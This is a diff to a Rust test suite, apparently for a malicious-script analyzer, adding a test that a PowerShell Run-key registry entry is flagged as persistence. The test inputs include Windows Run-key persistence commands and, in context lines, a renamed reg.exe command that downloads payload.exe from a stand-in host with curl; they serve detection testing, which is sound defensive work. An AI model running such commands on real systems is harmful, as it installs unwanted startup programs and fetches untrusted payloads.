@@ -2247,6 +2247,30 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn powershell_positional_run_key_itemproperty_emits_persistence_trait() {
+        let script = br#"powershell -Command "New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run Updater calc.exe"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Updater"
+                    && command == "calc.exe"
+            )),
+            "positional PowerShell Run-key persistence missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_reg_alias_replays_run_key_persisted_command() {
         let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
 C:\Users\Public\rg.tmp add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "cmd.exe /V:ON /c set U=https://copied-reg.example/payload.exe&&curl -o payload.exe !U!" /f
